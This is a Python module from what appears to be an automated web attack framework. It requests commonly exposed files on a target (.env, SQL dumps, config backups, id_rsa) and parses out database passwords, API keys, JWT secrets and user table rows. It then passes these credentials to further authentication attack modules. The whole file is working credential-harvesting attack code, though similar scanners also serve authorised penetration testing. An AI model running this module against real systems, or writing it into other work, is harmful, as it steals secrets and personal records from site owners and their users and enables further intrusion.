"""Sensitive File & Artifact Intelligence Exploiter Module (V15).

Ingests exposed artifacts (.sql, .env, .csv, .bak, .git):
- Parses environment variables (DB_PASSWORD, AWS_KEY, JWT_SECRET).
- Extracts SQL table dumps (INSERT INTO users ...).
- Dispatches credential discoveries directly back into the attack graph and Opportunity Bus.
"""

from __future__ import annotations

import logging
import re
from typing import Any, Dict, List, Optional
from urllib.parse import urljoin

from app.attacks.base import AttackPlan, BaseAttackModule, ValidationResult
from app.core.session_context import SessionContext
from app.orchestration.attack_opportunity import AttackOpportunity

logger = logging.getLogger("attacks.artifact")

HIGH_VALUE_ARTIFACTS = [
    ".env",
    ".env.backup",
    ".env.production",
    "backup.sql",
    "dump.sql",
    "database.sql",
    "users.csv",
    "config.php.bak",
    "wp-config.php.bak",
    "id_rsa",
]


class ArtifactAttackModule(BaseAttackModule):
    def __init__(self) -> None:
        super().__init__(attack_type="artifact", cwe_id="CWE-552", default_severity="CRITICAL")

    async def discover(self, target: str, context: Dict[str, Any]) -> List[AttackOpportunity]:
        opps: List[AttackOpportunity] = []
        base = target if "://" in target else f"http://{target}"
        for art in HIGH_VALUE_ARTIFACTS:
            opps.append(
                AttackOpportunity(
                    target=target,
                    endpoint=urljoin(base, f"/{art}"),
                    artifact=art,
                    attack_type="artifact",
                    hypothesis=f"Exposed artifact '{art}' may leak production credentials and sensitive configurations.",
                    priority=96,
                )
            )
        return opps

    async def plan(self, opportunity: AttackOpportunity) -> AttackPlan:
        return AttackPlan(
            title=f"Sensitive Artifact & Credential Intelligence on {opportunity.artifact}",
            attack_type="artifact",
            target=opportunity.endpoint,
            steps=[
                "1. Fetch exposed artifact endpoint with session client",
                "2. Verify artifact header / content type to eliminate soft-404 redirects",
                "3. Parse credential pairs, API tokens, and database dumps",
                "4. Synthesize credential attack opportunities for auth modules",
            ],
            payloads=[],
            expected_evidence="Exposed database credentials, secret keys, or plaintext user records.",
        )

    async def validate(self, opportunity: AttackOpportunity, session: SessionContext) -> ValidationResult:
        endpoint = opportunity.endpoint
        resp = await session.get(endpoint)

        if resp.status_code != 200 or resp.content_length < 15:
            return ValidationResult(
                is_vulnerable=False,
                confidence=0.0,
                proof_level="P0",
                attack_type="artifact",
                target_url=endpoint,
                message=f"Artifact {opportunity.artifact} not found (HTTP {resp.status_code}).",
            )

        body = resp.text
        extracted_creds: List[Dict[str, str]] = []
        extracted_keys: Dict[str, str] = {}

        # 1. Parse .env files
        if ".env" in endpoint:
            for line in body.splitlines():
                if "=" in line and not line.strip().startswith("#"):
                    k, _, v = line.partition("=")
                    k_clean = k.strip()
                    v_clean = v.strip().strip("'\"")
                    if any(s in k_clean.lower() for s in ("pass", "secret", "key", "token", "auth", "db")):
                        extracted_keys[k_clean] = v_clean

        # 2. Parse SQL dumps (INSERT INTO users ...)
        sql_user_matches = re.findall(
            r"insert\s+into\s+[`'\"]?(\w*user\w*)[`'\"]?.*?values\s*\((.*?)\);",
            body,
            re.I,
        )
        if sql_user_matches:
            for table, vals in sql_user_matches[:5]:
                extracted_creds.append({"table": table, "record": vals[:150]})

        # Check if high-confidence proof was established
        if extracted_keys or extracted_creds or "DB_PASSWORD" in body or "INSERT INTO" in body:
            poc_curl = f"curl -s -k '{endpoint}'"
            return ValidationResult(
                is_vulnerable=True,
                confidence=0.99,
                proof_level="P4",
                attack_type="artifact",
                target_url=endpoint,
                baseline_status=resp.status_code,
                exploit_status=resp.status_code,
                evidence={
                    "extracted_secrets": extracted_keys,
                    "extracted_database_records": extracted_creds,
                    "artifact_type": opportunity.artifact,
                    "response_sample": body[:400],
                },
                poc_curl=poc_curl,
                message=f"CRITICAL: Sensitive artifact exposure confirmed at {endpoint}. Extracted {len(extracted_keys)} configuration secrets / database records.",
                cwe_id="CWE-552",
                severity="CRITICAL",
            )

        return ValidationResult(
            is_vulnerable=False,
            confidence=0.2,
            proof_level="P0",
            attack_type="artifact",
            target_url=endpoint,
            message="Artifact returned HTTP 200 but contained no credentials or sensitive keywords (soft-404).",
        )
